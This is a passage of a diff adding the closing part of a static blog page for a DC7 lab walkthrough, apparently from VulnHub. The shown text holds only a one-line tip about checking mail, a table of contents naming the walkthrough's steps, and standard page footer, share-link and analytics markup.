+<p><em>Tips:</em> 可以用<code>mail</code>查看邮件<br><img src="/assets/DC7/Pasted%20image%2020260114211751.png"></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%90%9C%E5%AF%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1.搜寻信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95ssh"><span class="toc-number">2.</span> <span class="toc-text">2.登录ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.</span> <span class="toc-text">3.登录管理员</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&text=DC7"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&is_video=false&description=DC7"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DC7&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&name=DC7&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 zhaochoudecat
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
